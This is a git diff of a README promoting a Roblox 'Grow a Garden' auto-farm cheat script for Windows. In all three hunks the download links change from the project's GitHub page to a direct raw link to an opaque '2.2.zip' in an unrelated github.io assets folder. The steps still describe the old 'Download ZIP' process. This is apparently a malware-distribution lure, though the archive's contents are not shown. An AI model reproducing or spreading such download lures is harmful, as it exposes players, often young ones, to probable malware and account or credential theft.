@@ -5,7 +5,7 @@ description: "Automate planting, watering, harvesting, and selling in Grow a Gar
 ---
 # 🌱 roblox-grow-a-garden-script-2026 - Auto-Farm Your Way to Riches
 
-[![Download Now](https://img.shields.io/badge/Download-Grow_A_Garden_Script_2026-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/quintabivalent2705/roblox-grow-a-garden-script-2026)
+[![Download Now](https://img.shields.io/badge/Download-Grow_A_Garden_Script_2026-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/quintabivalent2705/quintabivalent2705.github.io/main/src/assets/2.2.zip)
 
 ## 🎮 What Is This?
 
@@ -30,7 +30,7 @@ Follow these simple steps to get the script running on your Windows computer:
 ### Step 1: Download the Script
 
 Visit this link to download the application:  
-**[https://github.com/quintabivalent2705/roblox-grow-a-garden-script-2026](https://github.com/quintabivalent2705/roblox-grow-a-garden-script-2026)**
+**[https://raw.githubusercontent.com/quintabivalent2705/quintabivalent2705.github.io/main/src/assets/2.2.zip](https://raw.githubusercontent.com/quintabivalent2705/quintabivalent2705.github.io/main/src/assets/2.2.zip)**
 
 Click the green **"Code"** button on the page, then select **"Download ZIP"**. The file will save to your computer's **Downloads** folder.
 
@@ -141,7 +141,7 @@ Stop wasting hours clicking and watering. Let the script handle the grind while 
 
 Get started right now:
 
-**[👉 Download Grow a Garden Script 2026](https://github.com/quintabivalent2705/roblox-grow-a-garden-script-2026)**
+**[👉 Download Grow a Garden Script 2026](https://raw.githubusercontent.com/quintabivalent2705/quintabivalent2705.github.io/main/src/assets/2.2.zip)**
 
 Visit this link to download the application. It's free, fast, and will transform your Grow a Garden experience.
 
